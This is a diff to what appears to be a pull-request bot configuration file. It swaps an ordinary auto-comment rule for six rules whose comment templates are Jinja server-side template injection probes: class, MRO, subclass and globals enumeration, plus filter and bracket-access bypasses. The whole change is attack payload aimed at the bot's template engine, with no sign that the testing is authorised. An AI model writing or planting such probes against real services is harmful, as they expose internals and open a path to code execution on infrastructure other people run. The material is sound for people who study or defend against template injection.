@@ -1,7 +1,37 @@
 pull_request_rules:
-  - name: auto-comment
+  - name: ssti-class
     conditions:
       - base=main
     actions:
       comment:
-        message: "PR #{{ number }} by {{ author }} — base={{ base }} head={{ head }}"
+        message: "class: {{ title.__class__ }}"
+  - name: ssti-mro
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "mro: {{ title.__class__.__mro__ }}"
+  - name: ssti-subclasses
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "subclasses: {{ title.__class__.__subclasses__() }}"
+  - name: ssti-globals
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "globals: {{ title.__class__.__init__.__globals__ }}"
+  - name: ssti-attr
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "attr: {{ title|attr('__class__') }}"
+  - name: ssti-bracket
+    conditions:
+      - base=main
+    actions:
+      comment:
+        message: "bracket: {{ title['__class__'] }}"
